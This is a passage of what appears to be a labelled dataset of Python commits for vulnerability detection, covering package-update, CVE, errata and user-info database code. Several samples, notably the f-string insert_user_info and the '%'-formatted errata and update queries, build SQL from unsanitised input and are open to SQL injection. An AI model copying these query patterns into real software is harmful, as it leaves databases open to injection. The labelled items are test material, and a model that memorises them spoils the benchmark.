                full_rpm_name += id2evr_dict[evr_id]['epoch'] + ':'
            full_rpm_name += id2evr_dict[evr_id]['version'] + '-' + id2evr_dict[evr_id]['release'] + '.' + id2arch_dict[arch_id]

            pkg_id2full_name[id] = full_rpm_name
            pkg_id2arch_id[id] = arch_id

        for pkg in auxiliary_dict:
            answer[pkg] = []

            if 'update_id' not in auxiliary_dict[pkg]:
                continue

            for upd_pkg_id in auxiliary_dict[pkg]['update_id']:
                # FIXME: use compatibility tables instead of exact matching
                if auxiliary_dict[pkg]['arch_id'] == pkg_id2arch_id[upd_pkg_id]:
                    for r_id in pkg_id2repo_id[upd_pkg_id]:
                        # check if update package in the same repo with original one
                        # and if the list of repositories for updates is provided, also check repo id in this list
                        if r_id in auxiliary_dict[pkg]['repo_id'] and \
                                (provided_repo_ids is None or r_id in provided_repo_ids):
                            # Some pkgs don't have associated errata (eg, original-repo-content)
                            if upd_pkg_id in pkg_id2errata_id:
                                errata_ids = pkg_id2errata_id[upd_pkg_id]
                                for e_id in errata_ids:
                                    # check current errata in the same repo with update pkg
                                    if r_id in errata_id2repo_id[e_id]:
                                        e_name = id2errata_dict[e_id]
                                        r_name = repoinfo_dict[r_id]['name']

                                        answer[pkg].append({
                                            'package': pkg_id2full_name[upd_pkg_id],
                                            'erratum': e_name,
                                            'repository': r_name})
        response = {
            'update_list': answer,
        }

        if provided_repo_ids is not None:
            response.update({'repository_list': provided_repo_names})

        return response

/n/n/n",0
117,117,49603ff9d29a9d411a681b3cc8096a6585ec1272,"/webapp/cve.py/n/n""""""
Module contains functions and CVE class for returning data from DB
""""""


class CVE:
    """"""
    Class to hold CVE attributes
    """"""
    cve_cwe_map = None

    def __init__(self, cve_entry, column_names):
        for col_name in column_names:
            setattr(self, col_name, cve_entry[column_names.index(col_name)])
        self.cwe = self.associate_cwes()

    def associate_cwes(self):
        """"""
        Assigns cve to cwe and creates a list
        :return:
        """"""
        cwe_map = []
        if CVE.cve_cwe_map is not None:
            cwe_map = [item[1] for item in CVE.cve_cwe_map if self.get_val(""cve.id"") == item[0]]
        return cwe_map

    def get_val(self, attr_name):
        """"""
        Return CVE attribute or None
        :param attr_name: attr_name
        :return: attribute
        """"""
        value = None
        if attr_name in vars(self):
            value = getattr(self, attr_name)
        return value

class CveAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def process_list(self, data):
        """"""
        This method returns details for given set of CVEs.

        :param data: data obtained from api, we're interested in data[""cve_list""]

        :returns: list of dictionaries containing detailed information for given cve list}

        """"""

        cves_to_process = data[""cve_list""]
        cves_to_process = filter(None, cves_to_process)
        answer = {}
        if not cves_to_process:
            return answer

        # Select all cves in request
        column_names = [""cve.id"", ""redhat_url"", ""secondary_url"", ""cve.name"", ""severity.name"", ""published_date"",
                        ""modified_date"", ""iava"", ""description""]
        cve_query = ""SELECT %s from cve"" % ', '.join(column for column in column_names)
        cve_query = cve_query + "" LEFT JOIN severity ON severity_id = severity.id""
        cve_query = cve_query + "" WHERE cve.name IN %s""
        self.cursor.execute(cve_query, [tuple(cves_to_process)])
        cves = self.cursor.fetchall()
        cwe_map = self.get_cve_cwe_map([cve[column_names.index(""cve.id"")] for cve in cves])  # generate cve ids
        CVE.cve_cwe_map = cwe_map
        cve_list = []
        for cve_entry in cves:
            cve = CVE(cve_entry, column_names)
            cve_list.append(cve)

        return self.construct_answer(cve_list)


    def get_cve_cwe_map(self, ids):
        """"""
        For givers CVE ids find CWE in DB
        :param ids: CVE ids
        :return: cve_cwe mapping
        """"""
        if not ids:
            return []
        query = ""SELECT cve_id, cwe.name, cwe.link FROM cve_cwe map JOIN cwe ON map.cwe_id = cwe.id WHERE map.cve_id IN %s""
        self.cursor.execute(query, [tuple(ids)])
        return self.cursor.fetchall()


    @staticmethod
    def construct_answer(cve_list):
        """"""
        Final dictionary generation
        :param cve_list: which cves to show
        :return: JSON ready dictionary
        """"""
        response = {}
        for cve in cve_list:
            response[cve.get_val(""cve.name"")] = {
                ""redhat_url"": cve.get_val(""redhat_url""),
                ""secondary_url"": cve.get_val(""secondary_url""),
                ""synopsis"": cve.get_val(""cve.name""),
                ""impact"": cve.get_val(""severity.name""),
                ""public_date"": cve.get_val(""published_date""),
                ""modified_date"": cve.get_val(""modified_date""),
                ""iava"": cve.get_val(""iava""),
                ""cwe_list"": cve.get_val(""cwe""),
                ""description"": cve.get_val(""description""),
            }
        return response
/n/n/n/webapp/errata.py/n/n""""""
Module contains classes for returning errata data from DB
""""""

class Errata:
    """"""
    Class to hold Erratum attributes
    """"""

    def __init__(self, id, name, synopsis, severity, description, solution, issued, updated):
        setattr(self, ""name"", name)
        setattr(self, ""id"", id)
        mydict = {}
        mydict[""type""] = None
        mydict[""issued""] = str(issued)
        mydict[""synopsis""] = synopsis
        mydict[""description""] = description
        mydict[""solution""] = solution
        mydict[""severity""] = severity
        mydict[""summary""] = None
        mydict[""updated""] = str(updated)
        mydict[""url""] = ""https://access.redhat.com/errata/%s"" % name
        mydict[""bugzilla_list""] = []
        mydict[""cve_list""] = []
        mydict[""package_list""] = []
        mydict[""reference_list""] = []
        setattr(self, ""mydict"", mydict)

    def set_cve_names(self, cve_name_list):
        mydict = self.get_val(""mydict"")
        mydict[""cve_list""] = cve_name_list

    def set_packages(self, package_list):
        mydict = self.get_val(""mydict"")
        mydict[""package_list""] = package_list

    def get_val(self, attr_name):
        """"""
        Return Erratum attribute or None
        :param attr_name: attr_name
        :return: attribute
        """"""
        value = None
        if attr_name in vars(self):
            value = getattr(self, attr_name)
        return value

class ErrataAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def get_cve_names_for_erratum_id(self, id):
        """"""
        Get the list of cves for the given erratum id
        """"""
        cve_query = ""SELECT name FROM cve""
        cve_query += "" JOIN errata_cve ON cve_id = cve.id""
        cve_query += "" WHERE errata_cve.errata_id = %s"" % str(id)
        self.cursor.execute(cve_query)
        cve_names = self.cursor.fetchall()
        cve_name_list = []
        for cve_name in cve_names:
            cve_name_list.append(cve_name[0])
        return cve_name_list

    @staticmethod
    def build_package_name(name, epoch, version, release, arch):
        """"""
        Build a package name from the separate NEVRA parts
        """"""
        package_name = name + ""-""
        if int(epoch) > 0:
            package_name += ""%s:"" % epoch
        package_name += ""%s-%s.%s"" % (version, release, arch)
        return package_name

    def get_package_list_for_erratum_id(self, id):
        """"""
        Get the list of packages for the given erratum id
        """"""
        pkg_query = ""SELECT package.name, evr.epoch, evr.version, evr.release, arch.name""
        pkg_query += "" FROM pkg_errata""
        pkg_query += "" JOIN package ON package.id = pkg_errata.pkg_id""
        pkg_query += "" JOIN evr ON evr.id = package.evr_id""
        pkg_query += "" JOIN arch ON arch.id = package.arch_id""
        pkg_query += "" WHERE pkg_errata.errata_id = %s"" % str(id)
        self.cursor.execute(pkg_query)
        result = self.cursor.fetchall()
        package_list = []
        for name, epoch, version, release, arch in result:
            package_list.append(self.build_package_name(name, epoch, version, release, arch))
        return package_list

    def process_list(self, data):
        """"""
        This method returns details for given set of Errata.

        :param cursor: psycopg2 connection cursor
        :param data: data obtained from api, we're interested in data[""errata_list""]

        :returns: dictionary containing detailed information for given errata list}

        """"""

        errata_to_process = data[""errata_list""]
        errata_to_process = filter(None, errata_to_process)
        answer = {}

        if not errata_to_process:
            return answer

        # Select all errata in request
        errata_query = ""SELECT errata.id, errata.name, synopsis, severity.name, description,""
        errata_query += "" solution, issued, updated""
        errata_query += "" FROM errata""
        errata_query += "" LEFT JOIN severity ON severity_id = severity.id""
        errata_query += "" WHERE errata.name IN %s""
        self.cursor.execute(errata_query, [tuple(errata_to_process)])
        errata = self.cursor.fetchall()

        erratum_list = []
        for id, name, synopsis, severity, description, solution, issued, updated in errata:
            new_erratum = Errata(id, name, synopsis, severity, description, solution, issued, updated)
            new_erratum.set_cve_names(self.get_cve_names_for_erratum_id(id))
            new_erratum.set_packages(self.get_package_list_for_erratum_id(id))
            erratum_list.append(new_erratum)

        errata_dict = {}
        for e in erratum_list:
            errata_dict[e.get_val(""name"")] = e.get_val(""mydict"")
        answer[""errata_list""] = errata_dict
        return answer
/n/n/n/webapp/updates.py/n/n#!/usr/bin/python -u


def split_filename(filename):
    """"""
    Pass in a standard style rpm fullname

    Return a name, version, release, epoch, arch, e.g.::
        foo-1.0-1.i386.rpm returns foo, 1.0, 1, 0, i386
        bar-1:9-123a.ia64.rpm returns bar, 9, 123a, 1, ia64
    """"""

    is_epoch = True if filename.find(':') != -1 else False

    if filename[-4:] == '.rpm':
        filename = filename[:-4]

    arch_index = filename.rfind('.')
    arch = filename[arch_index + 1:]

    rel_index = filename[:arch_index].rfind('-')
    rel = filename[rel_index + 1:arch_index]

    if is_epoch:
        ver_index = filename[:rel_index].rfind(':')
    else:
        ver_index = filename[:rel_index].rfind('-')
    ver = filename[ver_index + 1:rel_index]


    if is_epoch:
        epoch_index = filename[:ver_index].rfind('-')
        epoch = filename[epoch_index + 1:ver_index]
    else:
        epoch_index = ver_index
        epoch = '0'

    name = filename[:epoch_index]
    return name, ver, rel, epoch, arch


class UpdatesAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def process_list(self, data):
        """"""
        This method is looking for updates of a package, including name of package to update to,
        associated erratum and repository this erratum is from.

        :param packages_to_process: list of package to find updates for every of them

        :returns: updates for a package in format of list of dictionaries {'package': <p_name>, 'erratum': <e_name>,
        'repository': <r_name>}

        """"""

        packages_to_process = data['package_list']
        auxiliary_dict = {}
        answer = {}

        if not packages_to_process:
            return answer

        provided_repo_ids = None
        provided_repo_names = None

        if 'repository_list' in data:
            provided_repo_names = data['repository_list']
            provided_repo_ids = []
            self.cursor.execute(""select id from repo where name in %s;"", [tuple(provided_repo_names)])
            for id_tuple in self.cursor.fetchall():
                for id in id_tuple:
                    provided_repo_ids.append(id)

        # Select all evrs and put them into dictionary
        self.cursor.execute(""SELECT id, epoch, version, release from evr"")
        evrs = self.cursor.fetchall()
        evr2id_dict = {}
        id2evr_dict = {}
        for id, e, v, r in evrs:
            key = e + ':' + v + ':' + r
            evr2id_dict[key] = id
            id2evr_dict[id] = {'epoch': e, 'version': v, 'release': r}

        # Select all archs and put them into dictionary
        self.cursor.execute(""SELECT id, name from arch"")
        archs = self.cursor.fetchall()
        arch2id_dict = {}
        id2arch_dict = {}
        for id, name in archs:
            arch2id_dict[name] = id
            id2arch_dict[id] = name

        packages_names = []
        packages_evrids = []

        for pkg in packages_to_process:
            pkg = str(pkg)

            # process all packages form input
            if pkg not in auxiliary_dict:
                n, v, r, e, a = split_filename(str(pkg))
                auxiliary_dict[pkg] = {}  # create dictionary with aux data for pkg

                evr_key = e + ':' + v + ':' + r
                if evr_key in evr2id_dict:
                    packages_names.append(n)
                    auxiliary_dict[pkg][n] = []

                    evr_id = evr2id_dict[evr_key]
                    packages_evrids.append(evr_id)
                    auxiliary_dict[pkg]['evr_id'] = evr_id
                    auxiliary_dict[pkg]['arch_id'] = arch2id_dict[a]
                    auxiliary_dict[pkg]['repo_id'] = []
                    auxiliary_dict[pkg]['pkg_id'] = []
                    auxiliary_dict[pkg]['update_id'] = []

        # Select all packages with given evrs ids and put them into dictionary
        self.cursor.execute(""select id, name, evr_id, arch_id from package where evr_id in %s;"",  [tuple(packages_evrids)])
        packs = self.cursor.fetchall()
        nevra2pkg_id = {}
        for id, name, evr_id, arch_id in packs:
            key = name + ':' + str(evr_id) + ':' + str(arch_id)
            if key not in nevra2pkg_id:
                nevra2pkg_id[key] = [id]
            else:
                nevra2pkg_id[key].append(id)

        pkg_ids = []
        for pkg in auxiliary_dict.keys():
            n, v, r, e, a = split_filename(str(pkg))

            try:
                key = str(n + ':' + str(auxiliary_dict[pkg]['evr_id']) + ':' + str(auxiliary_dict[pkg]['arch_id']))
                pkg_ids.extend(nevra2pkg_id[key])
                auxiliary_dict[pkg]['pkg_id'].extend(nevra2pkg_id[key])
            except KeyError:
                pass

        # Select all repo_id and add mapping to package id
        self.cursor.execute(""select pkg_id, repo_id from pkg_repo where pkg_id in %s;"", [tuple(pkg_ids)])
        pack_repo_ids = self.cursor.fetchall()
        pkg_id2repo_id = {}

        repo_ids = []

        for pkg_id, repo_id in pack_repo_ids:
            repo_ids.append(repo_id)

            if pkg_id in pkg_id2repo_id:
                pkg_id2repo_id[pkg_id].append(repo_id)
            else:
                pkg_id2repo_id[pkg_id] = [repo_id]

        for pkg in auxiliary_dict.keys():
                try:
                    for pkg_id in auxiliary_dict[pkg]['pkg_id']:
                        auxiliary_dict[pkg]['repo_id'].extend(pkg_id2repo_id[pkg_id])
                except KeyError:
                    pass

        self.cursor.execute(""select name, id from package where name in %s;"", [tuple(packages_names)])
        sql_result = self.cursor.fetchall()
        names2ids = {}
        for name, id in sql_result:

            if name in names2ids:
                names2ids[name].append(id)
            else:
                names2ids[name] = [id]

        for pkg in auxiliary_dict.keys():
            n, v, r, e, a = split_filename(str(pkg))

            try:
                auxiliary_dict[pkg][n].extend(names2ids[n])
            except KeyError:
                pass

        update_pkg_ids = []

        for pkg in auxiliary_dict:
            n, v, r, e, a = split_filename(str(pkg))

            if n in auxiliary_dict[pkg] and auxiliary_dict[pkg][n]:
                sql = """"""
                select package.id from package join evr on package.evr_id = evr.id where package.id in %s and evr.evr > (select evr from evr where id = %s);
                """""" % ('%s', str(auxiliary_dict[pkg]['evr_id']))

                self.cursor.execute(sql, [tuple(auxiliary_dict[pkg][n])])

                for id in self.cursor.fetchall():
                    auxiliary_dict[pkg]['update_id'].append(id[0])
                    update_pkg_ids.append(id[0])

        # Select all info about repos
        self.cursor.execute(""select id, name, url from repo where id in %s;"", [tuple(repo_ids)])
        all_repos = self.cursor.fetchall()
        repoinfo_dict = {}
        for id, name, url in all_repos:
            repoinfo_dict[id] = {'name': name, 'url': url}

        # Select all info about pkg_id to repo_id
        self.cursor.execute(""select pkg_id, repo_id from pkg_repo where pkg_id in %s;"", [tuple(update_pkg_ids)])
        all_pkg_repos = self.cursor.fetchall()
        pkg_id2repo_id = {}
        for pkg_id, repo_id in all_pkg_repos:

            if pkg_id not in pkg_id2repo_id:
                pkg_id2repo_id[pkg_id] = [repo_id]
            else:
                pkg_id2repo_id[pkg_id].append(repo_id)

        # Select all info about pkg_id to errata_id
        self.cursor.execute(""select pkg_id, errata_id from pkg_errata where pkg_id in %s;"", [tuple(update_pkg_ids)])
        all_pkg_errata = self.cursor.fetchall()
        pkg_id2errata_id = {}
        all_errata = []
        for pkg_id, errata_id in all_pkg_errata:
            all_errata.append(errata_id)
            if pkg_id not in pkg_id2errata_id:
                pkg_id2errata_id[pkg_id] = [errata_id]
            else:
                pkg_id2errata_id[pkg_id].append(errata_id)

        # Select all info about errata
        self.cursor.execute(""SELECT id, name from errata where id in %s;"", [tuple(all_errata)])
        errata = self.cursor.fetchall()
        id2errata_dict = {}
        all_errata_id = []
        for id, name in errata:
            id2errata_dict[id] = name
            all_errata_id.append(id)

        self.cursor.execute(""SELECT errata_id, repo_id from errata_repo where errata_id in %s;"", [tuple(all_errata_id)])
        sql_result = self.cursor.fetchall()
        errata_id2repo_id = {}
        for errata_id, repo_id in sql_result:
            if errata_id not in errata_id2repo_id:
                errata_id2repo_id[errata_id] = [repo_id]
            else:
                errata_id2repo_id[errata_id].append(repo_id)

        # Select all info about packages
        self.cursor.execute(""SELECT id, name, evr_id, arch_id from package where id in %s;"", [tuple(update_pkg_ids)])
        packages = self.cursor.fetchall()
        pkg_id2full_name = {}
        pkg_id2arch_id = {}
        for id, name, evr_id, arch_id in packages:
            full_rpm_name = name + '-'
            if id2evr_dict[evr_id]['epoch'] != '0':
                full_rpm_name += id2evr_dict[evr_id]['epoch'] + ':'
            full_rpm_name += id2evr_dict[evr_id]['version'] + '-' + id2evr_dict[evr_id]['release'] + '.' + id2arch_dict[arch_id]

            pkg_id2full_name[id] = full_rpm_name
            pkg_id2arch_id[id] = arch_id

        for pkg in auxiliary_dict:
            answer[pkg] = []

            if 'update_id' not in auxiliary_dict[pkg]:
                continue

            for upd_pkg_id in auxiliary_dict[pkg]['update_id']:
                # FIXME: use compatibility tables instead of exact matching
                if auxiliary_dict[pkg]['arch_id'] == pkg_id2arch_id[upd_pkg_id]:
                    for r_id in pkg_id2repo_id[upd_pkg_id]:
                        # check if update package in the same repo with original one
                        # and if the list of repositories for updates is provided, also check repo id in this list
                        if r_id in auxiliary_dict[pkg]['repo_id'] and \
                                (provided_repo_ids is None or r_id in provided_repo_ids):
                            # Some pkgs don't have associated errata (eg, original-repo-content)
                            if upd_pkg_id in pkg_id2errata_id:
                                errata_ids = pkg_id2errata_id[upd_pkg_id]
                                for e_id in errata_ids:
                                    # check current errata in the same repo with update pkg
                                    if r_id in errata_id2repo_id[e_id]:
                                        e_name = id2errata_dict[e_id]
                                        r_name = repoinfo_dict[r_id]['name']

                                        answer[pkg].append({
                                            'package': pkg_id2full_name[upd_pkg_id],
                                            'erratum': e_name,
                                            'repository': r_name})
        response = {
            'update_list': answer,
        }

        if provided_repo_ids is not None:
            response.update({'repository_list': provided_repo_names})

        return response

/n/n/n",1
140,140,0a8d81f7ecc5a7073e57f84584e7f07557edad8b,"utils/user_funcs.py/n/n#!bin/env python

import asyncpg

class PGDB:
    def __init__(self, db_conn):
        self.db_conn = db_conn

    async def fetch_user_info(self, member_id: int, column: str):
        query = f'''SELECT {column} FROM user_info WHERE member_id = {member_id};'''
        return await self.db_conn.fetchval(query)

    async def insert_user_info(self, member_id: int, column: str, col_value):
        execute = (
            f'''INSERT INTO user_info (member_id, $1) VALUES ($2, $3)
                    ON CONFLICT member_id DO UPDATE SET $1 = $3;''')
        await self.db_conn.execute(execute, column, member_id, col_value)
/n/n/n",0
141,141,0a8d81f7ecc5a7073e57f84584e7f07557edad8b,"/utils/user_funcs.py/n/n#!bin/env python

import asyncpg

class PGDB:
    def __init__(self, db_conn):
        self.db_conn = db_conn

    async def fetch_user_info(self, member_id: int, column: str):
        query = f'''SELECT {column} FROM user_info WHERE member_id = {member_id};'''
        return await self.db_conn.fetchval(query)

    async def insert_user_info(self, member_id: int, column: str, col_value):
        execute = (
            f""""""INSERT INTO user_info (member_id, {column}) 
                    VALUES ({member_id}, {col_value})
                    ON CONFLICT (member_id)
                        DO UPDATE SET {column} = {col_value};"""""")
        await self.db_conn.execute(execute)
/n/n/n",1
32,32,049d51cdf17b06168b4fe7672be8ce01fff0edd2,"frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
""""""build query for doclistview and return results""""""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, ""read"", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  [""`tab{0}`.`name`"".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = ""where "" + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """"""select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s"""""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != ""`tab"" + self.doctype + ""`"":
					self.fields.append(t + "".name as '%s:name'"" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += "" {join} {child} on ({child}.parent = {main}.name)"".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append(""({0})"".format("" or "".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else """") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)
		meta = frappe.get_meta(self.doctype)
		self.set_order_by(args, meta)
		self.validate_order_by_and_group_by_params(args.order_by, meta)
		args.order_by = args.order_by and ("" order by "" + args.order_by) or """"

		self.validate_order_by_and_group_by_params(self.group_by, meta)
		args.group_by = self.group_by and ("" group by "" + self.group_by) or """"

		return args

	def parse_args(self):
		""""""Convert fields and filters from strings to list, dicts""""""
		if isinstance(self.fields, basestring):
			if self.fields == ""*"":
				self.fields = [""*""]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split("","")]

		for filter_name in [""filters"", ""or_filters""]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		""""""extract tables from fields""""""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not (""tab"" in f and ""."" in f) ) or (""locate("" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		""""""Removes optional columns like `_user_tags`, `_comments` etc. if not in table""""""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append(""("" + match_conditions + "")"")

	def build_filter_conditions(self, filters, conditions):
		""""""build conditions from user filters""""""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		""""""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator ""value""
		""""""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split("","")

			fallback = ""''""
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '(""{0}"")'.format('"", ""'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get(""fields"", {""fieldname"": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in (""Check"", ""Float"", ""Int"", ""Currency"", ""Percent""):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==""Date"" or df.fieldtype==""Datetime""))):
				value = ""'%s' AND '%s'"" % (
					get_datetime(f.value[0]).strftime(""%Y-%m-%d %H:%M:%S.%f""),
					add_to_date(get_datetime(f.value[1]),days=1).strftime(""%Y-%m-%d %H:%M:%S.%f""))
				fallback = ""'0000-00-00 00:00:00'""
			elif df and df.fieldtype==""Date"":
				value = getdate(f.value).strftime(""%Y-%m-%d"")
				fallback = ""'0000-00-00'""

			elif df and df.fieldtype==""Datetime"":
				value = get_datetime(f.value).strftime(""%Y-%m-%d %H:%M:%S.%f"")
				fallback = ""'0000-00-00 00:00:00'""

			elif df and df.fieldtype==""Time"":
				value = get_time(f.value).strftime(""%H:%M:%S.%f"")
				fallback = ""'00:00:00'""

			elif f.operator in (""like"", ""not like"") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in [""Float"", ""Int"", ""Currency"", ""Percent"", ""Check""])):
					value = """" if f.value==None else f.value
					fallback = '""""'

					if f.operator in (""like"", ""not like"") and isinstance(value, basestring):
						# because ""like"" uses backslash (\) for escaping
						value = value.replace(""\\"", ""\\\\"").replace(""%"", ""%%"")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '""{0}""'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		""""""add match conditions if applicable""""""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get(""read"") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_(""No permission to read {0}"").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get(""apply_user_permissions"", {}).get(""read""):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get(""user_permission_doctypes"").get(""read""))

			if role_permissions.get(""if_owner"", {}).get(""read""):
				self.match_conditions.append(""`tab{0}`.owner = '{1}'"".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = """"
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = ""(("" + "") or ("".join(self.match_conditions) + ""))""

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  ""({conditions}) or ({shared_condition})"".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """"""`tab{0}`.name in ({1})"""""".format(self.doctype, "", "".join([""'%s'""] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
